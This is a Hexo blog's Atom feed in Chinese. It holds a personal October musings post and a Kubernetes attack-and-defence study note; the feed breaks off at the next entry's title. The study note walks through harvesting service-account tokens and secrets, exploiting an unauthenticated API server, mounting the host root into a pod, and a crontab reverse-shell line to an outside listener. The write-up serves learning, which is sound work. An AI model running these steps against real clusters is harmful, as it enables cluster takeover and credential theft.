<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-11-07T14:28:43.410Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>10月随笔</title>
    <link href="http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/"/>
    <id>http://example.com/2023/11/07/2023%E5%B9%B410%E6%9C%88%E9%9A%8F%E7%AC%94/</id>
    <published>2023-11-06T16:00:00.000Z</published>
    <updated>2023-11-07T14:28:43.410Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Elaina_68.png" alt="Elaina"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在我自己写的东西，分为了两块，一块是以博客为主的长内容，一块是以频道为主短内容。<br>博客是任何人都能看，频道只有我自己能看。<br>为什么这样分呢？<br>主要是有些时候，只是想说一两句话罢了，或者稍微发发牢骚，如果写个博客有点浪费，也没价值。所以不如放在频道里。<br>然后我打算每过一个月，将频道里我认为还算有价值的内容，发到博客。这样也算是去粗留精了。</p><h1 id="装饰"><a href="#装饰" class="headerlink" title="装饰"></a>装饰</h1><p>如果一个人只有见人，才会整理打扮仪容，那说明本质上这个人对外貌所作的“装饰”只是为了别人，而非自己。</p><h1 id="从众"><a href="#从众" class="headerlink" title="从众"></a>从众</h1><p>昨日去喝了粥，喝了之后感觉良好，但在这之前，我都不知道有这么一家店的存在。<br>现在想了想，大概是因外表比较简陋，店内客人不多，让我忽略了它。<br>所谓不可貌相，时刻在提醒我。<br>也能看出，从众，不一定就是对的。大多数时候只是为了减小风险而做的保守策略罢了，但有时也要敢于冒险。</p><h1 id="文化"><a href="#文化" class="headerlink" title="文化"></a>文化</h1><p>文化是一种影响存在的氛围。</p><h1 id="无聊"><a href="#无聊" class="headerlink" title="无聊"></a>无聊</h1><p>当人工作忙起来了一段日子，再去做一些简单信息量低的事，就会觉得无聊。因为输入小于消化的速度。</p><h1 id="关心"><a href="#关心" class="headerlink" title="关心"></a>关心</h1><p>很多时候，人们询问他人私事只是出于好奇，而非关心。</p><h1 id="价值"><a href="#价值" class="headerlink" title="价值"></a>价值</h1><p>价值，就是创造或延伸一种存在的概念。</p><h1 id="世界"><a href="#世界" class="headerlink" title="世界"></a>世界</h1><p>错的不是我，而是这个世界。</p><p>读完马斯克传后，这句话能理解了。</p><h1 id="紧迫"><a href="#紧迫" class="headerlink" title="紧迫"></a>紧迫</h1><p>不要陷入到一种慢吞吞的节奏中，不要认为什么东西很难，保持紧迫感。</p><h1 id="聊天"><a href="#聊天" class="headerlink" title="聊天"></a>聊天</h1><p>聊天主要带来的就是情绪价值。<br>如果是跟值得的人一起聊，那么或许还能提高认知，获得知识。<br>前者是至少应有的，后者不当过度期望。</p><h1 id="鼻子"><a href="#鼻子" class="headerlink" title="鼻子"></a>鼻子</h1><p>《鼻子》  芥川龙之介<br>我的思考：<br>我自己想要的，真的是我想要的吗？还是别人眼中的自己。<br>融入群体，与他人别无二致，是为了更好的自己，还是为了处于群体中的安心感。</p><h1 id="精力"><a href="#精力" class="headerlink" title="精力"></a>精力</h1><p>我想要让自己时刻保持精力充沛，而不是一天死气沉沉要死不活的样子。</p><p>查阅相关资料与结合个人思考，我认为应该采取以下措施：</p><ol><li>起床后锻炼5分钟</li><li>激烈地表达</li><li>多喝水</li><li>多补充能量</li><li>听摇滚音乐</li><li>一次只做一件事</li><li>再坚持10分钟</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来，自己一个月的思考并不多，不知道是因为忙碌，还是因为到了一定程度就开始迟缓呢？<br>10月读了两本书，艾萨克森的《埃隆马斯克传》和芥川龙之介的《罗生门》。前者给了我一些处世哲学的转变，后者给了我自身与人性的思考。<br>10月interview了不少，可惜都没过呢。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Elaina_68.png&quot; alt=&quot;Elaina&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="随想" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/"/>
    
    <category term="10月" scheme="http://example.com/categories/%E9%9A%8F%E6%83%B3/10%E6%9C%88/"/>
    
    
    <category term="随想" scheme="http://example.com/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>K8s集群安全攻防学习</title>
    <link href="http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/"/>
    <id>http://example.com/2023/11/02/K8s%E9%9B%86%E7%BE%A4%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E5%AD%A6%E4%B9%A0/</id>
    <published>2023-11-01T16:00:00.000Z</published>
    <updated>2023-11-02T00:47:28.320Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。</p><span id="more"></span><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>Container(容器)是一种便携式、轻量级的操作系统级虚拟化技术，它使用namespace隔离不同的软件运行环境，并通过镜像自包含软件的运行环境，从而使得容器可以很方便的在任何地方运行，由于容器体积小且启动快，因此可以在每个容器镜像中打包一个应用程序，这种一对一的应用镜像关系拥有很多好处，使用容器不需要与外部的基础架构环境绑定，因为每一个应用程序都不需要外部依赖，更不需要与外部的基础架构环境依赖，完美解决了从开发到生产环境的一致性问题</p><h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Kubernetes使用Pod来管理容器，每个Pod可以包含一个或多个紧密关联的容器，Pod是一组紧密关联的容器集合，它们共享PID、IPC、Network 和UTS Namespace，是Kubernetes调度的基本单位，Pod内的多个容器共享网络和文件系统，可以通过进程间通信和文件共享这种简单高效的方式组合完成服务<br><img src="/simg/K8s-1.png" alt="pod"><br>在Kubernetes中对象使用ManiFest(YAML或JSON)来定义，一个简单的Nginx服务可以定义为nginx.yaml，它包含一个镜像为nginx的容器，示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">    labels:</span><br><span class="line">        app: nginx</span><br><span class="line">spec:</span><br><span class="line">    containers:</span><br><span class="line">    -name: nginx</span><br><span class="line">         image: nginx</span><br><span class="line">         ports:</span><br><span class="line">        -containerPort: 80</span><br></pre></td></tr></table></figure><h2 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h2><p>Node是Pod真正运行的主机，可以是物理机，也可以是虚拟机，为了管理Pod每个Node节点上至少要运行Container Runtime(比如docker或者rkt)、 Kubelet和Kube-proxy服务<br><img src="/simg/K8s-2.png" alt="node"></p><h2 id="Namespace"><a href="#Namespace" class="headerlink" title="Namespace"></a>Namespace</h2><p>Namespace是对一组资源和对象的抽象集合，比如可以用来将系统内部的对象划分为不同的项目组或用户组，常见的pods, services, replication controllers和deployments等都是属于某一个namespace的(默认是default)，而node, persistentVolumes等则不属于任何namespace</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service是应用服务的抽象，通过labels为应用提供负载均衡和服务发现，匹配labels的Pod IP和端口列表组成endpoints，由kube-proxy负责将服务IP负载均衡到这些endpoints上，通常每一个Service都会自动分配一个Cluster IP(仅在集群内部可访问的虚拟地址)和DNS名，其他容器可以通过该地址或DNS来访问服务，而不需要了解后端容器的运行：<br><img src="/simg/K8s-2.png" alt="service"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">    name: nginx</span><br><span class="line">spec:</span><br><span class="line">    ports:</span><br><span class="line">        - port: 8078 # the port that this service should serve on</span><br><span class="line">        name: http</span><br><span class="line">        # the container on each pod to connect to, can be a name</span><br><span class="line">        # (e.g. &#x27;www&#x27;) or a number (e.g. 80)</span><br><span class="line">        targetPort: 80</span><br><span class="line">        protocol: TCP</span><br><span class="line">    selector:</span><br><span class="line">        app: nginx</span><br></pre></td></tr></table></figure><h1 id="架构概览"><a href="#架构概览" class="headerlink" title="架构概览"></a>架构概览</h1><h2 id="架构源起"><a href="#架构源起" class="headerlink" title="架构源起"></a>架构源起</h2><p>Borg是谷歌内部的大规模集群管理系统，负责对谷歌内部很多核心服务的调度和管理，Borg的目的是让用户能够不必操心资源管理的问题，让他们专注于自己的核心业务，并且做到跨多个数据中心的资源利用率最大化<br>Borg主要由BorgMaster、Borglet、Borgcfg和Scheduler组成，架构示意图如下：<br><img src="/simg/K8s-4.png" alt="borg"><br>Borglet：负责真正运行任务(在容器中)<br>Borgcfg：Borg的命令行工具，用于跟Borg系统交互，一般通过一个配置文件来提交任务<br>Scheduer：负责任务的调度，根据应用的特点将其调度到具体的机器上去<br>BorgMaster：是整个集群的大脑，负责维护整个集群的状态，并将数据持久化到 Paxos 存储中</p><h2 id="架构模型"><a href="#架构模型" class="headerlink" title="架构模型"></a>架构模型</h2><p>K8s借鉴了Borg的设计理念，比如:Pod、Service、Label、单Pod、单IP等，Kubernetes的整体架构跟Borg非常像，如下图所示：<br><img src="/simg/K8s-5.png" alt="k8s"><br>K8s主要由以下几个核心组件组成：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API 注册和发现等机制<br>controller manager：负责维护集群的状态，比如：故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CSI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI)<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><h1 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h1><p>Kubernetes主要由以下几个核心组件组成，这也是我们对K8s进行安全评估的主要测试维度：<br>etcd：保存了整个集群的状态<br>apiserver：提供了资源操作的唯一入口，并提供认证、授权、访问控制、API注册和发现等机制<br>controller manager：负责维护集群的状态，比如故障检测、自动扩展、滚动更新等<br>scheduler：负责资源的调度，按照预定的调度策略将Pod调度到相应的机器上<br>kubelet：负责维护容器的生命周期，同时也负责Volume(CVI)和网络(CNI)的管理<br>Container runtime：负责镜像管理以及Pod和容器的真正运行(CRI）<br>kube-proxy：负责为Service提供cluster内部的服务发现和负载均衡</p><p><img src="/simg/K8s-6.png" alt="kubernetes"></p><p>下面是关键组件的一些常用默认端口：<br><img src="/simg/K8s-7.png" alt="Protocol"></p><h1 id="渗透路径"><a href="#渗透路径" class="headerlink" title="渗透路径"></a>渗透路径</h1><p>常见的K8S的渗透路径：<br><img src="/simg/K8s-8.png" alt="path"><br>形象的K8S的渗透过程：<br><img src="/simg/K8s-9.png" alt="path"></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我们评估是如果获取到应用的webshell权限时是很有必要判断一下当前的环境的，最狠的一次是之前打HW的时候有厂商搭建了一套完整的域环境的蜜罐系统，看着你打…..，所以这个阶段要做的还是信息收集</p><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><p><code>env</code><br><img src="/simg/K8s-10.png" alt="env"></p><p><code>env | grep KUBERNETES</code><br><img src="/simg/K8s-11.png" alt="env"></p><h2 id="容器检测"><a href="#容器检测" class="headerlink" title="容器检测"></a>容器检测</h2><p>注意下面的.dockerenv：<br><code>ls -al</code><br><img src="/simg/K8s-12.png" alt="ls"></p><h2 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h2><p>需要下载kubectl到pod中，之后通过执行以下命令来获取node节点的内核版本信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl get nodes -o jsonpath=&#x27;&#123;range .items[*]&#125;&#123;.metadata.name&#125;&#123;&quot;\t&quot;&#125;&#123;.status.nodeInfo.kernelVersion&#125;&#123;&quot;\n&quot;&#125;&#123;end&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-13.png" alt="kubectl"></p><h2 id="Token类"><a href="#Token类" class="headerlink" title="Token类"></a>Token类</h2><p>K8s集群创建的Pod中容器内部默认携带K8s Service Account认证凭据(&#x2F;run&#x2F;secrets&#x2F;kubernetes.io&#x2F;serviceaccount&#x2F;token)，利用该凭据可以认证K8s API-Server服务器并访问高权限接口，如果执行成功意味着该账号拥有高权限，可以直接利用Service Account管理K8s集群<br><code>cat /var/run/secrets/kuberenetes.io/serviceaccount/token</code><br><img src="/simg/K8s-14.png" alt="token"></p><h2 id="Secret类"><a href="#Secret类" class="headerlink" title="Secret类"></a>Secret类</h2><p>K8s Secrets用于存储敏感数据，从Secrets中获取的AK及通信凭证可用户后续渗透中从外部或云产品API窃取信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-secret-dump (auto|&lt;service-account-token-path&gt;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">./cdk run k8s-secret-dump auto</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-15.png" alt="secret"></p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><p>对于已经获取了kubeconfig或sa账号权限，进而想要创建特殊配置的容器，但是受到了K8s Pod Security Policies的限制时可以使用这个Exploit获取Pod Security Policies的规则信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">命令格式</span></span><br><span class="line">./cdk run k8s-psp-dump (auto|&lt;service-account-token-path&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">./cdk run k8s-psp-dump auto</span><br><span class="line">2021/03/24 22:15:58 getting K8s api-server API addr.</span><br><span class="line">    Find K8s api-server in ENV: https://ip:8443</span><br><span class="line">2021/03/24 22:15:58 trying to dump K8s Pod Security Policies with local service-account: token</span><br><span class="line">2021/03/24 22:15:58 requesting  /apis/policy/v1beta1/podsecuritypolicies</span><br><span class="line">2021/03/24 22:15:58 dump Pod Security Policies success, saved in:  k8s_pod_security_policies.json</span><br><span class="line">2021/03/24 22:15:58 requesting  /api/v1/namespaces/default/pods</span><br><span class="line">2021/03/24 22:15:58 K8S Pod Security Policies rule list:</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostPID: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; securityContext.hostIPC: true &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[0].hostPath.pathPrefix: \&quot;/proc\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[1].hostPath.pathPrefix: \&quot;/dev\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[2].hostPath.pathPrefix: \&quot;/sys\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; volumes[3].hostPath.pathPrefix: \&quot;/\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_ADMIN\&quot; &#125; is not allowed.</span><br><span class="line">2021/03/24 22:15:58 rule &#123; containers[0].securityContext.capabilities.add: \&quot;SYS_PTRACE\&quot; &#125; is not allowed.</span><br></pre></td></tr></table></figure><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><p><img src="/simg/K8s-16.png" alt="port"></p><h2 id="内部网络"><a href="#内部网络" class="headerlink" title="内部网络"></a>内部网络</h2><p>Flannel默认使用10.244.0.0&#x2F;16网络<br>Calico默认使用192.168.0.0&#x2F;16网络</p><h1 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h1><p>这一部分主要介绍一些常见的因为K8s自身的漏洞或者安全配置不当导致的可被利用的漏洞点：</p><h2 id="未授权类"><a href="#未授权类" class="headerlink" title="未授权类"></a>未授权类</h2><h3 id="K8s-API-Server未授权"><a href="#K8s-API-Server未授权" class="headerlink" title="K8s API Server未授权"></a>K8s API Server未授权</h3><h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><p>k8s的Master节点上会暴露kube-apiserver，默认情况下会开启以下两个HTTP端口：<br>A：Localhost Port</p><ul><li>HTTP服务</li><li>主机访问受保护</li><li>在HTTP中没有认证和授权检查</li><li>默认端口8080，修改标识–insecure-port</li><li>默认IP是本地主机，修改标识—insecure-bind-address</li></ul><p>B：Secure Port</p><ul><li>使用基于策略的授权方式</li><li>认证方式，令牌文件或者客户端证书</li><li>默认端口6443，修改标识—secure-port</li><li>默认IP是首个非本地主机的网络接口，修改标识—bind-address</li><li>HTTPS服务。设置证书和秘钥的标识，–tls-cert-file，–tls-private-key-file</li></ul><p>以上两个端口主要存在以下两类安全风险：<br>开发者使用8080端口并将其暴露在公网上，攻击者就可以通过该端口的API直接对集群下发指令<br>运维人员将”system:anonymous”用户绑定到”cluster-admin”用户组，使匿名用户可以通过6443端口以管理员权限向集群内部下发指令</p><h4 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h4><p>在浏览器中访问以下URL：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">http://ip:port/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用实例</span></span><br><span class="line">http://192.168.17.144:8080/</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-17.png" alt="poc"><br>返回以上信息说明存在K8s API Server未授权访问漏洞~</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用方式按严重程度可分为以下两种攻击类型：</p><ul><li>通过利用kubectl客户端调用Secure Port接口去控制已经创建好的容器</li><li>通过创建一个自定义的容器将系统根目录的文件挂载到&#x2F;mnt目录，之后通过修改&#x2F;mnt&#x2F;etc&#x2F;crontab来影响宿主机的crontab，通过反弹Shell拿到宿主机的权限</li></ul><h4 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h4><p>Step 1：获取目标机器的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port get nodes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 get nodes</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-18.png" alt="container"><br>备注说明：如果出现”Error from server (NotFound): the server could not find the requested resource”报错，可能是因为Kubectl客户端和K8s的Server端版本不相同导致的需要进行降级操作，此时需要将版本降低到和目标主机版本一致即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.8.7/bin/linux/amd64/kubectl</span><br><span class="line">chmod 777 kubectl</span><br><span class="line">mv /usr/bin/kubectl /usr/bin/kubectl.bak</span><br><span class="line">mv kubectl /usr/bin/kubectl</span><br></pre></td></tr></table></figure><p>Step 2：获取命名空间<br><code>kubectl -s 192.168.17.144:8080 get namespace</code><br><img src="/simg/K8s-19.png" alt="namespace"></p><p>Step 3：获取某一命名空间下的Pod列表<br><code>kubectl -s 192.168.17.144:8080 get pod -n default</code></p><p>Step 4：执行以下命令接管pod，可以看到下方返回的提示是”pod nginx does not have a host assigned”，这是由于pod未指定host所致</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">格式说明</span></span><br><span class="line">kubectl -s ip:port  --namespace=default exec -it dockername bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">执行实例</span></span><br><span class="line">kubectl -s 192.168.17.144:8080 -n default exec -it nginx /bin/sh</span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-20.png" alt="pod"></p><p>nginx的yaml文件如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>                      </span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>                           </span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span>                       </span><br><span class="line"><span class="attr">spec:</span>                               </span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx:alpine</span>             </span><br><span class="line">    <span class="attr">name:</span> <span class="string">container-0</span>               </span><br><span class="line">    <span class="attr">resources:</span>                      </span><br><span class="line">      <span class="attr">limits:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">      <span class="attr">requests:</span></span><br><span class="line">        <span class="attr">cpu:</span> <span class="string">100m</span></span><br><span class="line">        <span class="attr">memory:</span> <span class="string">200Mi</span></span><br><span class="line">  <span class="attr">imagePullSecrets:</span>                 </span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default-secret</span></span><br></pre></td></tr></table></figure><p>如果幸运的化我们可以找到恰当的Pod并通过信息收集以及逃逸获取宿主机的权限，之后控制节点以及整个集群</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>A、Web Dashboard<br>Step 1：查看当前Namespace确定命名空间有哪些<br><code>kubectl -s 192.168.17.144:8080 get namespaces</code><br><img src="/simg/K8s-21.png" alt="namespace"></p><p>Step 2：查看”kubernetes-dashboard”命名空间下pod与service的详细状态<br><code>kubectl -s 192.168.17.144:8080 get pods,svc -n kubernetes-dashboard -o wide</code><br><img src="/simg/K8s-22.png" alt="dashboard"></p><p>Step 3：查看Serviceaccount和Secrets<br><code>kubectl -s 192.168.17.144:8080 get sa,secrets -n kubernetes-dashboard</code><br><img src="/simg/K8s-23.png" alt="secrets"></p><p>Step 4：查看token，在这里我们要根据上一步的输出进行多项service-account-token的查看，因为部分会应权限而导致操作有限<br><code>kubectl -s 192.168.17.144:8080 describe secrets admin-myuser-token-jcj9d -n kubernetes-dashboard</code><br><img src="/simg/K8s-24.png" alt="token"></p><p>Step 5：尝试登录DashBoard<br><img src="/simg/K8s-25.png" alt="login"></p><p>Step 6：创建一个pod，并将本地根目录挂载到pod的&#x2F;mnt目录中</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">myapp</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">container</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">mountPath:</span> <span class="string">/mnt</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">  <span class="attr">volumes:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test-volume</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure><p><img src="/simg/K8s-26.png" alt="pod"><br><img src="/simg/K8s-27.png" alt="pod"></p><p>Step 7：之后可以看到创建的myapp Pod<br><img src="/simg/K8s-28.png" alt="pod"></p><p>Step 8：之后进入挂载的&#x2F;mnt目录中，就是master节点的对应目录了<br><img src="/simg/K8s-29.png" alt="pod"><br><img src="/simg/K8s-30.png" alt="pod"></p><p>Step 9：之后写计划任务<br><code>echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.17.158/4444 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab</code><br><img src="/simg/K8s-31.png" alt="pod"></p><p>Step 10：成功反弹shell<br><img src="/simg/K8s-32.png" alt="pod"></p><p>后面懒得写了…</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://xz.aliyun.com/t/12921">K8s集群安全攻防(上)</a><br><a href="https://xz.aliyun.com/t/12930">K8s集群安全攻防(下)</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为感觉是一个比较重要的部分，之前接触较少，于是打算系统性地学习一下。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>MISC杂项 - buuctf</title>
    <link href="http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/"/>
    <id>http://example.com/2023/11/01/MISC%E6%9D%82%E9%A1%B9%20-%20buuctf/</id>
    <published>2023-10-31T16:00:00.000Z</published>
    <updated>2023-11-04T12:54:22.394Z</updated>
    
